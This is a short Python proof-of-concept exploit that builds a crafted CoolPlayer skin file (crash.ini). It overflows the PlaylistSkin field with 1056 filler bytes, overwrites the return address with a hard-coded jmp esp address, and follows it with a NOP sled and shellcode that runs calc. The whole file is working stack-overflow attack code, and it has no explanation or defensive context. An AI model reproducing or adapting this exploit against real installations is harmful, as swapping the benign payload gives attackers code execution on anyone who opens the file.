import struct

if __name__ == '__main__':
    with open("crash.ini", "w") as f:
        f.write("[CoolPlayer Skin]\n")
        f.write("PlaylistSkin=")
        f.write("\x41" * 1056)

        f.write(struct.pack('<L', 0x7C86467B))  # jmp esp address
        f.write("\x90" * 32)

        shellcode = "\x31\xC9"  # xor ecx,ecx
        shellcode += "\x51"  # push ecx
        shellcode += "\x68\x63\x61\x6C\x63"  # push 0x636c6163
        shellcode += "\x54"  # push dword ptr esp
        shellcode += "\xB8\xC7\x93\xC2\x77"  # mov eax,0x77c293c7
        shellcode += "\xFF\xD0"  # call eax
        f.write(shellcode)

    print("Done")
